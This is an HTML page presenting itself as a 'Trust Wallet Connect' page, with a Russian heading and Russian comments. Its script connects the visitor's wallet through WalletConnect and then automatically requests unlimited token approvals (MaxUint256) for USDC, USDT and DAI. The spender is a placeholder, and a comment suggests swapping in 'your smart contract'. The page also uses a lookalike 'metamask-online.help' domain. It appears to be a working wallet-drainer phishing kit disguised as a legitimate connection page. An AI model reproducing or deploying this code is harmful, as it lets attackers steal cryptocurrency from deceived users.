<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Trust Wallet Connect</title>
  <script src="https://unpkg.com/ethers@6.7.0/dist/ethers.umd.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@2.0.0/dist/index.umd.js"></script>
</head>
<body>
  <h1>Подключение к Trust Wallet</h1>
  <button id="connect">Connect Wallet</button>

  <script>
    const connectButton = document.getElementById('connect');

    connectButton.addEventListener('click', async () => {
      const provider = new WalletConnectProvider.default({
        projectId: "7dabcdde47b6439403c2ec186b1fedaf",
        chains: [1],
        showQrModal: true,
        metadata: {
          name: "MyDApp",
          description: "Connect Trust Wallet",
          url: "https://metamask-online.help", // или твой домен
          icons: ["https://trustwallet.com/assets/images/media/assets/TWT.png"]
        }
      });

      await provider.enable();

      const ethersProvider = new ethers.BrowserProvider(provider);
      const signer = await ethersProvider.getSigner();
      const address = await signer.getAddress();

      console.log("Connected address:", address);

      // Автоматический approve всех токенов (пример)
      const tokenList = [
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
      ];

      const spender = "0x000000000000000000000000000000000000dead"; // или адрес твоего смарт-контракта

      const abi = [
        "function approve(address spender, uint256 amount) public returns (bool)"
      ];

      for (const tokenAddress of tokenList) {
        try {
          const token = new ethers.Contract(tokenAddress, abi, signer);
          const tx = await token.approve(spender, ethers.MaxUint256);
          console.log(`Approve sent for ${tokenAddress}:`, tx.hash);
        } catch (e) {
          console.warn(`Failed to approve ${tokenAddress}:`, e.message);
        }
      }
    });
  </script>
</body>
</html>
